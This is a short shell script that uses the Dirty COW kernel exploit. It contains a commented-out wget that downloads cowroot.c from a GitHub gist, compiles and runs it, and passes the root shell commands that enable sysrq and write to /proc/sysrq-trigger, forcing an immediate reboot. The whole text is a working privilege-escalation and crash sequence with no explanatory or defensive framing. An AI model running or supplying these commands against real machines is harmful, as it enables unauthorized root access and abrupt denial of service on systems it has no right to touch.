id
#wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c
gcc cowroot.c -o cowroot -pthread
./cowroot <<"EOF"
id
echo 1 > /proc/sys/kernel/sysrq
echo b > /proc/sysrq-trigger
EOF
